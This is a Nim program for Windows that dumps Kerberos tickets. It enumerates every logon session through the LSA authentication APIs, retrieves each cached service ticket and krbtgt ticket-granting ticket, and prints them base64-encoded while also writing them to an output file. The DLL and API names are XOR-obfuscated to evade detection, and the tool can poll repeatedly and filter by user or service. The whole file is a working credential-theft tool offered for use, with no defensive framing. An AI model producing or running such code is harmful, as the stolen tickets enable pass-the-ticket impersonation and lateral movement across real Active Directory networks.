import std/[winlean, os, strutils, times]

type
  LUID = object
    LowPart: uint32
    HighPart: int32
  LsaString = object
    Length: uint16
    MaximumLength: uint16
    Buffer: cstring
  UniString = object
    Length: uint16
    MaximumLength: uint16
    Buffer: pointer
  SecHandle = object
    dwLower: uint
    dwUpper: uint
  LogonSessionData = object
    Size: uint32
    LogonId: LUID
    UserName: UniString
    LogonDomain: UniString
    AuthenticationPackage: UniString
    LogonType: uint32
    Session: uint32
    Sid: pointer
    LogonTime: int64
    LogonServer: UniString
    DnsDomainName: UniString
    Upn: UniString
  KerbQueryTicketCacheRequest = object
    MessageType: uint32
    LogonId: LUID
  KerbTicketCacheInfoEx = object
    ClientName: UniString
    ClientRealm: UniString
    ServerName: UniString
    ServerRealm: UniString
    StartTime: int64
    EndTime: int64
    RenewTime: int64
    EncryptionType: int32
    TicketFlags: uint32
  KerbRetrieveTicketRequest = object
    MessageType: uint32
    LogonId: LUID
    TargetName: UniString
    TicketFlags: uint32
    CacheOptions: uint32
    EncryptionType: int32
    CredentialsHandle: SecHandle
  KerbCryptoKey = object
    KeyType: int32
    Length: int32
    Value: pointer
  KerbExternalTicket = object
    ServiceName: pointer
    TargetName: pointer
    ClientName: pointer
    DomainName: UniString
    TargetDomainName: UniString
    AltTargetDomainName: UniString
    SessionKey: KerbCryptoKey
    TicketFlags: uint32
    Flags: uint32
    KeyExpirationTime: int64
    StartTime: int64
    EndTime: int64
    RenewUntil: int64
    TimeSkew: int64
    EncodedTicketSize: uint32
    EncodedTicket: pointer

proc loadLibraryA(name: cstring): pointer
  {.stdcall, dynlib: "kernel32", importc: "LoadLibraryA".}
proc getProcAddress(handle: pointer; name: cstring): pointer
  {.stdcall, dynlib: "kernel32", importc: "GetProcAddress".}
proc copyMemory(dst, src: pointer; len: int)
  {.stdcall, dynlib: "kernel32", importc: "RtlMoveMemory".}

type
  FConnect = proc(handle: ptr pointer): int32 {.stdcall.}
  FDeregister = proc(handle: pointer): int32 {.stdcall.}
  FLookup = proc(handle: pointer; packageName: ptr LsaString; authPackage: ptr uint32): int32 {.stdcall.}
  FCall = proc(handle: pointer; authPackage: uint32; submitBuffer: pointer; submitLength: uint32;
               returnBuffer: ptr pointer; returnLength: ptr uint32; protocolStatus: ptr int32): int32 {.stdcall.}
  FFree = proc(buffer: pointer): int32 {.stdcall.}
  FStatus = proc(status: uint32): uint32 {.stdcall.}
  FEnumSessions = proc(count: ptr uint64; sessions: ptr pointer): int32 {.stdcall.}
  FSessionData = proc(logonId: ptr LUID; data: ptr pointer): int32 {.stdcall.}

var
  pConnect: FConnect
  pDeregister: FDeregister
  pLookup: FLookup
  pCall: FCall
  pFree: FFree
  pStatus: FStatus
  pEnumSessions: FEnumSessions
  pSessionData: FSessionData
  outPath: string

proc deobf(data: openArray[uint8]): string =
  result = newString(data.len)
  for i, b in data:
    result[i] = char(b xor 0x5a'u8)

proc loadApis(): bool =
  let sec = loadLibraryA(deobf([0x29'u8,0x3f,0x39,0x2f,0x28,0x69,0x68,0x74,0x3e,0x36,0x36]).cstring)
  let adv = loadLibraryA(deobf([0x3b'u8,0x3e,0x2c,0x3b,0x2a,0x33,0x69,0x68,0x74,0x3e,0x36,0x36]).cstring)
  if sec == nil or adv == nil: return false
  pConnect = cast[FConnect](getProcAddress(sec, deobf([0x16'u8,0x29,0x3b,0x19,0x35,0x34,0x34,0x3f,0x39,0x2e,0x0f,0x34,0x2e,0x28,0x2f,0x29,0x2e,0x3f,0x3e]).cstring))
  pDeregister = cast[FDeregister](getProcAddress(sec, deobf([0x16'u8,0x29,0x3b,0x1e,0x3f,0x28,0x3f,0x3d,0x33,0x29,0x2e,0x3f,0x28,0x16,0x35,0x3d,0x35,0x34,0x0a,0x28,0x35,0x39,0x3f,0x29,0x29]).cstring))
  pLookup = cast[FLookup](getProcAddress(sec, deobf([0x16'u8,0x29,0x3b,0x16,0x35,0x35,0x31,0x2f,0x2a,0x1b,0x2f,0x2e,0x32,0x3f,0x34,0x2e,0x33,0x39,0x3b,0x2e,0x33,0x35,0x34,0x0a,0x3b,0x39,0x31,0x3b,0x3d,0x3f]).cstring))
  pCall = cast[FCall](getProcAddress(sec, deobf([0x16'u8,0x29,0x3b,0x19,0x3b,0x36,0x36,0x1b,0x2f,0x2e,0x32,0x3f,0x34,0x2e,0x33,0x39,0x3b,0x2e,0x33,0x35,0x34,0x0a,0x3b,0x39,0x31,0x3b,0x3d,0x3f]).cstring))
  pFree = cast[FFree](getProcAddress(sec, deobf([0x16'u8,0x29,0x3b,0x1c,0x28,0x3f,0x3f,0x08,0x3f,0x2e,0x2f,0x28,0x34,0x18,0x2f,0x3c,0x3c,0x3f,0x28]).cstring))
  pStatus = cast[FStatus](getProcAddress(adv, deobf([0x16'u8,0x29,0x3b,0x14,0x2e,0x09,0x2e,0x3b,0x2e,0x2f,0x29,0x0e,0x35,0x0d,0x33,0x34,0x1f,0x28,0x28,0x35,0x28]).cstring))
  pEnumSessions = cast[FEnumSessions](getProcAddress(sec, deobf([0x16'u8,0x29,0x3b,0x1f,0x34,0x2f,0x37,0x3f,0x28,0x3b,0x2e,0x3f,0x16,0x35,0x3d,0x35,0x34,0x09,0x3f,0x29,0x29,0x33,0x35,0x34,0x29]).cstring))
  pSessionData = cast[FSessionData](getProcAddress(sec, deobf([0x16'u8,0x29,0x3b,0x1d,0x3f,0x2e,0x16,0x35,0x3d,0x35,0x34,0x09,0x3f,0x29,0x29,0x33,0x35,0x34,0x1e,0x3b,0x2e,0x3b]).cstring))
  pConnect != nil and pDeregister != nil and pLookup != nil and pCall != nil and
    pFree != nil and pStatus != nil and pEnumSessions != nil and pSessionData != nil

const B64 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"

proc b64Encode(data: string): string =
  var i = 0
  while i < data.len:
    let b0 = ord(data[i])
    inc i
    var b1 = -1
    if i < data.len:
      b1 = ord(data[i])
      inc i
    var b2 = -1
    if i < data.len:
      b2 = ord(data[i])
      inc i
    result.add B64[(b0 shr 2) and 0x3f]
    result.add B64[((b0 and 0x3) shl 4) or (if b1 >= 0: (b1 shr 4) else: 0)]
    if b1 >= 0:
      result.add B64[((b1 and 0xf) shl 2) or (if b2 >= 0: (b2 shr 6) else: 0)]
    else:
      result.add '='
    if b2 >= 0:
      result.add B64[b2 and 0x3f]
    else:
      result.add '='

proc emitLine(line: string) =
  echo line
  if outPath.len > 0:
    try:
      var f = open(outPath, fmAppend)
      try:
        f.write(line)
        f.write("\r\n")
      finally:
        f.close()
    except CatchableError:
      discard

proc uniToString(u: UniString): string =
  if u.Buffer == nil or u.Length == 0: return ""
  let chars = int(u.Length div 2)
  let p = cast[ptr UncheckedArray[uint16]](u.Buffer)
  for i in 0 ..< chars:
    let w = p[i]
    if w == 0: break
    if w <= 0x7f'u16: result.add chr(int(w)) else: result.add '?'

proc asciiToUtf16Le(text: string): string =
  for c in text:
    result.add c
    result.add '\0'
  result.add '\0'
  result.add '\0'

proc readBlob(lsa: pointer; authPack: uint32; luid: LUID;
              targetName: string; ticketFlags: uint32): tuple[ok: bool; data, err: string] =
  let targetUtf = asciiToUtf16Le(targetName)
  let baseSize = sizeof(KerbRetrieveTicketRequest)
  let totalSize = baseSize + targetUtf.len
  let buf = alloc0(totalSize)
  if buf == nil: return (false, "", "alloc failed")
  var retBuf: pointer = nil
  try:
    var req = cast[ptr KerbRetrieveTicketRequest](buf)
    req.MessageType = 8'u32
    req.LogonId = luid
    req.TargetName.Length = uint16(targetUtf.len - 2)
    req.TargetName.MaximumLength = uint16(targetUtf.len)
    req.TargetName.Buffer = cast[pointer](cast[uint](buf) + uint(baseSize))
    req.TicketFlags = ticketFlags
    req.CacheOptions = 0x8'u32
    req.EncryptionType = 0
    copyMemory(req.TargetName.Buffer, unsafeAddr targetUtf[0], targetUtf.len)
    var retLen: uint32 = 0
    var protStatus: int32 = 0
    let status = pCall(lsa, authPack, buf, uint32(totalSize),
      addr retBuf, addr retLen, addr protStatus)
    if status != 0 or protStatus != 0 or retBuf == nil or retLen == 0:
      return (false, "", "op failed status=" & $status & " protocol=" & $protStatus &
        " win32=" & $pStatus(uint32(protStatus)))
    let ext = cast[ptr KerbExternalTicket](retBuf)
    if ext.EncodedTicket == nil or ext.EncodedTicketSize == 0:
      return (false, "", "empty output")
    var raw = newString(int(ext.EncodedTicketSize))
    copyMemory(addr raw[0], ext.EncodedTicket, raw.len)
    return (true, raw, "")
  finally:
    if retBuf != nil: discard pFree(retBuf)
    dealloc(buf)

proc dumpOnce(lsa: pointer; authPack: uint32; userFilter, serviceFilter: string;
              seen: var seq[string]): int =
  var count: uint64 = 0
  var luidPtr: pointer = nil
  let enumStatus = pEnumSessions(addr count, addr luidPtr)
  if enumStatus != 0 or luidPtr == nil:
    emitLine("enum failed status=" & $enumStatus)
    return 0
  defer: discard pFree(luidPtr)
  var found = 0
  let luids = cast[ptr UncheckedArray[LUID]](luidPtr)
  for i in 0 ..< int(count):
    let luid = luids[i]
    var sessionPtr: pointer = nil
    if pSessionData(unsafeAddr luid, addr sessionPtr) != 0 or sessionPtr == nil: continue
    defer: discard pFree(sessionPtr)
    let session = cast[ptr LogonSessionData](sessionPtr)
    let username = uniToString(session.UserName)
    let domain = uniToString(session.LogonDomain)
    let dnsDomain = uniToString(session.DnsDomainName)
    if userFilter.len > 0 and not username.toLowerAscii().contains(userFilter): continue
    var sessionFound = 0
    var query = KerbQueryTicketCacheRequest(MessageType: 14'u32, LogonId: luid)
    var ticketsPtr: pointer = nil
    var retLen: uint32 = 0
    var protStatus: int32 = 0
    let qstatus = pCall(lsa, authPack, addr query,
      uint32(sizeof(KerbQueryTicketCacheRequest)), addr ticketsPtr, addr retLen, addr protStatus)
    if qstatus == 0 and protStatus == 0 and ticketsPtr != nil:
      defer: discard pFree(ticketsPtr)
      let ticketCount = cast[ptr UncheckedArray[uint32]](ticketsPtr)[1]
      let first = cast[uint](ticketsPtr) + 8'u
      for j in 0 ..< int(ticketCount):
        let info = cast[ptr KerbTicketCacheInfoEx](first + uint(j * sizeof(KerbTicketCacheInfoEx)))
        let server = uniToString(info.ServerName)
        let client = uniToString(info.ClientName)
        let realm = uniToString(info.ClientRealm)
        if serviceFilter.len > 0 and not server.toLowerAscii().startsWith(serviceFilter): continue
        let retrieveFlags = if server.toLowerAscii().startsWith("krbtgt/"): 0'u32 else: info.TicketFlags
        let got = readBlob(lsa, authPack, luid, server, retrieveFlags)
        if got.ok:
          let key = $luid.HighPart & ":" & $luid.LowPart & ":" & client & "@" & realm & ":" & server
          if key in seen:
            continue
          seen.add key
          inc found
          inc sessionFound
          emitLine("LUID=0x" & toHex(luid.LowPart) & " USER=" & domain & "\\" & username &
            " CLIENT=" & client & "@" & realm & " SERVER=" & server)
          emitLine(b64Encode(got.data))
        elif found == 0:
          emitLine("read failed for " & domain & "\\" & username & " " & server & ": " & got.err)
    if sessionFound == 0 and serviceFilter.startsWith("krbtgt"):
      let realm =
        if dnsDomain.len > 0: dnsDomain.toUpperAscii()
        elif domain.len > 0 and "." in domain: domain.toUpperAscii()
        else: ""
      if realm.len > 0:
        let server = "krbtgt/" & realm
        let got = readBlob(lsa, authPack, luid, server, 0'u32)
        if got.ok:
          let key = $luid.HighPart & ":" & $luid.LowPart & ":" & username & "@" & realm & ":" & server
          if key notin seen:
            seen.add key
            inc found
            emitLine("LUID=0x" & toHex(luid.LowPart) & " USER=" & domain & "\\" & username &
              " CLIENT=" & username & "@" & realm & " SERVER=" & server)
            emitLine(b64Encode(got.data))
        elif found == 0:
          emitLine("direct read failed for " & domain & "\\" & username & " " & server & ": " & got.err)
  result = found

proc parsePositiveInt(value: string; fallback: int): int =
  try:
    result = parseInt(value)
    if result <= 0: result = fallback
  except CatchableError:
    result = fallback

proc main() =
  let userFilter = if paramCount() >= 1: paramStr(1).toLowerAscii() else: ""
  let serviceFilter = if paramCount() >= 2: paramStr(2).toLowerAscii() else: ""
  let seconds = if paramCount() >= 3: parsePositiveInt(paramStr(3), 1) else: 1
  let interval = if paramCount() >= 4: parsePositiveInt(paramStr(4), 1) else: 1
  outPath = if paramCount() >= 5: paramStr(5) else: getAppFilename() & ".out"
  try: removeFile(outPath) except CatchableError: discard
  if not loadApis():
    emitLine("api load failed")
    quit(1)
  var lsa: pointer = nil
  let connectStatus = pConnect(addr lsa)
  if connectStatus != 0 or lsa == nil:
    emitLine("connect failed status=" & $connectStatus)
    quit(1)
  defer: discard pDeregister(lsa)
  var name = deobf([0x31'u8,0x3f,0x28,0x38,0x3f,0x28,0x35,0x29])
  var ls = LsaString(Length: uint16(name.len), MaximumLength: uint16(name.len + 1), Buffer: name.cstring)
  var authPack: uint32 = 0
  let lookupStatus = pLookup(lsa, addr ls, addr authPack)
  if lookupStatus != 0:
    emitLine("lookup failed status=" & $lookupStatus)
    quit(1)

  let stopAt = epochTime() + float(seconds)
  var total = 0
  var seen: seq[string] = @[]
  while true:
    total += dumpOnce(lsa, authPack, userFilter, serviceFilter, seen)
    if epochTime() >= stopAt: break
    sleep(interval * 1000)
  if total == 0:
    emitLine("no matches")

when isMainModule:
  main()
